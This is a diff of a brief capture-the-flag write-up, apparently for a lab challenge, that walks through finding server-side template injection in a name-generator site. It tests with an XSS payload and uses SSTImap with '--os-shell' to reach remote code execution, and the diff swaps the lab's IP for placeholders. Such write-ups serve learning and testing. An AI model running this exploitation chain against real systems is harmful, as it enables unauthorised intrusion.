@@ -5,7 +5,7 @@ There's a new trend of an application that generates a spooky name for you. User
 
 ## Steps 
 
-1. navigate to the website --##http://83.136.253.44:47350/?text=1
+1. navigate to the website and u see a parameter /text=1
 
 2. intercept the request through burpsuite and execute a simple xss payload and it triggered look at the response it uses Templates for every class so it could be SSTI 
 
@@ -31,7 +31,7 @@ result ->
         </tr>
             </tbody>
 4. use SSTImap 
-python3 sstimap.py -u --##http://83.136.253.44:47350/?text=1 --os-shell
+python3 sstimap.py -u http://IP:PORT/?text=1 --os-shell
 
 5. finally u got RCE 
 ls /
